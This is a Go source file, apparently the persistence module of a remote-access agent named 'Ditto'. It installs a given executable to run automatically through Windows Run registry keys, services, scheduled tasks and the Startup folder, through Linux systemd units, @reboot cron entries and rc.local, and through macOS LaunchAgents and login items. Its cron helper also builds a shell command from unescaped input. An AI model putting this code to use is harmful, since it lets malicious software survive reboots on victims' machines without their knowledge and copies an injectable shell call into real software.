package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

// Installer handles persistence installation
type Installer struct {
	targetPath   string
	startupMethod string
}

// NewInstaller creates a new persistence installer
func NewInstaller(targetPath, method string) *Installer {
	return &Installer{
		targetPath:    targetPath,
		startupMethod: method,
	}
}

// Install installs persistence mechanism
func (i *Installer) Install() error {
	switch runtime.GOOS {
	case "windows":
		return i.installWindows()
	case "linux":
		return i.installLinux()
	case "darwin":
		return i.installDarwin()
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

func (i *Installer) installWindows() error {
	switch i.startupMethod {
	case "registry":
		return i.installWindowsRegistry()
	case "service":
		return i.installWindowsService()
	case "scheduled":
		return i.installWindowsScheduled()
	case "startup":
		return i.installWindowsStartup()
	default:
		return i.installWindowsRegistry()
	}
}

func (i *Installer) installWindowsRegistry() error {
	// Install via Run/RunOnce registry keys
	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	valueName := filepath.Base(i.targetPath)
	
	return setRegistryValue(keyPath, valueName, i.targetPath)
}

func (i *Installer) installWindowsService() error {
	// Install as Windows service
	return createWindowsService("DittoService", i.targetPath)
}

func (i *Installer) installWindowsScheduled() error {
	// Install via Task Scheduler
	return createScheduledTask("DittoTask", i.targetPath)
}

func (i *Installer) installWindowsStartup() error {
	// Copy to startup folder
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	target := filepath.Join(startupPath, filepath.Base(i.targetPath))
	
	return copyFile(i.targetPath, target)
}

func (i *Installer) installLinux() error {
	switch i.startupMethod {
	case "systemd":
		return i.installLinuxSystemd()
	case "cron":
		return i.installLinuxCron()
	case "rc":
		return i.installLinuxRC()
	default:
		return i.installLinuxSystemd()
	}
}

func (i *Installer) installLinuxSystemd() error {
	// Install as systemd service
	serviceContent := fmt.Sprintf(`[Unit]
Description=Ditto Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always

[Install]
WantedBy=multi-user.target`, i.targetPath)
	
	servicePath := "/etc/systemd/system/ditto.service"
	return writeServiceFile(servicePath, serviceContent)
}

func (i *Installer) installLinuxCron() error {
	// Install via crontab
	cronEntry := fmt.Sprintf("@reboot %s", i.targetPath)
	return addCronEntry(cronEntry)
}

func (i *Installer) installLinuxRC() error {
	// Install via rc.local
	rcLocal := "/etc/rc.local"
	entry := fmt.Sprintf("%s &\n", i.targetPath)
	return appendToFile(rcLocal, entry)
}

func (i *Installer) installDarwin() error {
	switch i.startupMethod {
	case "launchd":
		return i.installDarwinLaunchd()
	case "loginitem":
		return i.installDarwinLoginItem()
	default:
		return i.installDarwinLaunchd()
	}
}

func (i *Installer) installDarwinLaunchd() error {
	// Install as launchd plist
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.ditto.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>%s</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>`, i.targetPath)
	
	plistPath := os.Getenv("HOME") + "/Library/LaunchAgents/com.ditto.agent.plist"
	return writeFile(plistPath, plistContent)
}

func (i *Installer) installDarwinLoginItem() error {
	// Install as login item
	return addLoginItem(i.targetPath)
}

// Platform-specific helpers
func setRegistryValue(keyPath, valueName, value string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("registry operations only supported on Windows")
	}
	
	// Use registry package if available, otherwise use reg.exe command
	cmd := exec.Command("reg", "add", keyPath, "/v", valueName, "/t", "REG_SZ", "/d", value, "/f")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to set registry value: %w", err)
	}
	return nil
}

func createWindowsService(name, path string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows service creation only supported on Windows")
	}
	
	// Use sc.exe to create service
	cmd := exec.Command("sc", "create", name, fmt.Sprintf("binpath= \"%s\"", path), "start= auto")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to create Windows service: %w (may require administrator privileges)", err)
	}
	
	// Start the service
	startCmd := exec.Command("sc", "start", name)
	if err := startCmd.Run(); err != nil {
		return fmt.Errorf("failed to start service: %w", err)
	}
	
	return nil
}

func createScheduledTask(name, path string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("scheduled task creation only supported on Windows")
	}
	
	// Use schtasks.exe to create scheduled task
	cmd := exec.Command("schtasks", "/create", "/tn", name, "/tr", path, "/sc", "onlogon", "/f")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to create scheduled task: %w (may require administrator privileges)", err)
	}
	
	return nil
}

func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0755)
}

func writeServiceFile(path, content string) error {
	return os.WriteFile(path, []byte(content), 0644)
}

func addCronEntry(entry string) error {
	if runtime.GOOS == "windows" {
		return fmt.Errorf("cron entries only supported on Unix-like systems")
	}
	
	// Read current crontab
	cmd := exec.Command("crontab", "-l")
	currentCron, err := cmd.Output()
	if err != nil {
		// If no crontab exists, that's okay - we'll create one
		currentCron = []byte{}
	}
	
	// Append new entry
	newCron := string(currentCron)
	if newCron != "" && newCron[len(newCron)-1] != '\n' {
		newCron += "\n"
	}
	newCron += entry + "\n"
	
	// Write new crontab using echo and pipe
	cmd = exec.Command("sh", "-c", fmt.Sprintf("echo '%s' | crontab -", newCron))
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to add cron entry: %w (may require appropriate permissions)", err)
	}
	
	return nil
}

func appendToFile(path, content string) error {
	file, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = file.WriteString(content)
	return err
}

func writeFile(path, content string) error {
	return os.WriteFile(path, []byte(content), 0644)
}

func addLoginItem(path string) error {
	if runtime.GOOS != "darwin" {
		return fmt.Errorf("login items only supported on macOS")
	}
	
	// Use osascript to add login item
	script := fmt.Sprintf(`tell application "System Events"
		make login item at end with properties {path:"%s", hidden:false}
	end tell`, path)
	
	cmd := exec.Command("osascript", "-e", script)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to add login item: %w", err)
	}
	
	return nil
}

